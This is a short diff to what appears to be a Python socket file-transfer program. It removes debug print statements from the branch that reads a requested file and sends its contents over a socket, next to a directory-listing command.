@@ -57,13 +57,9 @@ while str(msg) != 'exit':
             for f in fl:
                 if fn == f:
                     ff = open(str(fn), 'rb')
-                    print('file opened')
                     fd = ff.read()
-                    print('file read')
                     ff.close()
-                    print('file closed')
                     s.send(fd)
-                    print('file sent')
                     break
         elif msg == 'ls':
             fl = os.listdir(os.getcwd())
